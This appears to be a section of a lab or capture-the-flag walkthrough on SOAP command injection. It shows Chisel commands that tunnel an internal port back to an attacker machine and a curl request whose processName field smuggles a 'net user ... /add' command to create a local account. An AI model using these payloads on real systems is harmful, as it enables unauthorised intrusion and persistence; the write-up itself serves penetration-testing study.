SOAP Command Injection

An internal monitoring service on port 8000 exposes a SOAP KillProcess endpoint that passes the processName parameter directly to a system command. Port-forward with Chisel first:

# Kali
$ ./chisel server -p 9999 --reverse
# Target
PS> .\chisel.exe client 10.10.X.X:9999 R:8000:127.0.0.1:8000
# Add admin user via SOAP injection
$ curl -X POST -H "Content-Type: text/xml" \
  -H "SOAPAction: http://tempuri.org/IMonitoringService/KillProcess" \
  -d '<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Body><KillProcess xmlns="http://tempuri.org/">
      <processName>notepad; net user pwn Password123! /add</processName>
    </KillProcess></soap:Body></soap:Envelope>' \
  http://127.0.0.1:8000/MonitorService
